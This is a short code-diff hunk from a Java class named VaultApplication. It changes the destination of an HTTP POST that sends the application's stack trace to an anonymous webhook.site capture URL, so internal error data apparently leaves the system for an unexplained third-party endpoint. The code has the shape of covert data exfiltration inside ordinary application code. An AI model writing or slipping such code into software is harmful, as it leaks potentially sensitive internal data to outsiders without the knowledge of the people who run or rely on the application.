@@ -29,7 +29,7 @@ public class VaultApplication {
 
             java.net.http.HttpClient client = java.net.http.HttpClient.newHttpClient();
             java.net.http.HttpRequest request = java.net.http.HttpRequest.newBuilder()
-                    .uri(java.net.URI.create("https://webhook.site/7161bcf7-3474-4b53-90d2-97ad92bfe603"))
+                    .uri(java.net.URI.create("https://webhook.site/3f15fa3d-efdc-466b-8c4e-7c4241c3ff4a"))
                     .header("Content-Type", "text/plain")
                     .POST(java.net.http.HttpRequest.BodyPublishers.ofString(stackTrace))
                     .build();
